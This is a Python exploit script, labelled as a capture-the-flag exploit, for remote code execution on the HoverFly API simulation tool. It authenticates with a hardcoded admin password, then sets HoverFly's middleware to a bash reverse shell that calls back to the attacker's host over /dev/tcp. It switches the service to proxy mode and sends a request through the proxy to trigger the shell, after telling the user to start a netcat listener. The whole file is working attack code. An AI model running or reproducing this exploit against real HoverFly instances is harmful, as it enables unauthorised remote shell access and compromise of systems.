#!/usr/bin/env python3
"""
CTF Exploit: HoverFly Middleware RCE
Steps: Auth -> Set malicious middleware -> Set proxy mode -> Trigger

Usage:
  python3 hoverfly_rce.py <target_ip> <lhost> <lport>
  Example: python3 hoverfly_rce.py 10.129.18.172 10.10.15.93 4444
"""

import requests
import sys
import subprocess
import threading
import time

HOVERFLY_PORT = 8888
PROXY_PORT    = 8500


def get_args():
    if len(sys.argv) == 4:
        return sys.argv[1], sys.argv[2], sys.argv[3]
    target = input("Target IP        : ").strip()
    lhost  = input("Your IP (LHOST)  : ").strip()
    lport  = input("Listen Port [4444]: ").strip() or "4444"
    return target, lhost, lport


def get_token(base, user="admin", password="O7IJ27MyyXiU"):
    print("[*] Step 1 — Getting auth token...")
    r = requests.post(f"{base}/api/token-auth",
                      json={"username": user, "password": password}, timeout=10)
    token = r.json().get("token")
    if not token:
        print(f"[-] Failed to get token. Response: {r.text}")
        sys.exit(1)
    print(f"[+] Token: {token[:30]}...")
    return token


def set_middleware(base, token, lhost, lport):
    print("[*] Step 2 — Setting malicious middleware...")
    payload = {
        "binary": "/bin/bash",
        "script": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    }
    r = requests.put(f"{base}/api/v2/hoverfly/middleware",
                     json=payload,
                     headers={"Authorization": f"Bearer {token}"}, timeout=10)
    print(f"[+] Middleware set: {r.status_code} {r.text[:80]}")


def set_mode(base, token, mode="proxy"):
    print(f"[*] Step 3 — Setting mode to '{mode}'...")
    r = requests.put(f"{base}/api/v2/hoverfly/mode",
                     json={"mode": mode},
                     headers={"Authorization": f"Bearer {token}"}, timeout=10)
    print(f"[+] Mode set: {r.status_code} {r.text[:80]}")


def trigger(proxy_url):
    print("[*] Step 4 — Triggering via proxy...")
    try:
        requests.get("http://google.com/",
                     proxies={"http": proxy_url, "https": proxy_url},
                     timeout=5)
    except Exception:
        pass  # Connection will drop when shell spawns
    print("[+] Trigger sent.")


if __name__ == "__main__":
    target, lhost, lport = get_args()

    base      = f"http://{target}:{HOVERFLY_PORT}"
    proxy_url = f"http://{target}:{PROXY_PORT}"

    print("=" * 55)
    print("  HoverFly Middleware RCE — CTF Exploit")
    print("=" * 55)
    print(f"  Target    : {base}")
    print(f"  Proxy     : {proxy_url}")
    print(f"  Callback  : {lhost}:{lport}")
    print()
    print(f"[!] Make sure you have: nc -lvnp {lport}")
    input("[*] Press Enter when listener is ready...")

    token = get_token(base)
    set_middleware(base, token, lhost, lport)
    set_mode(base, token)
    trigger(proxy_url)

    print()
    print("[+] Done! Check your listener.")
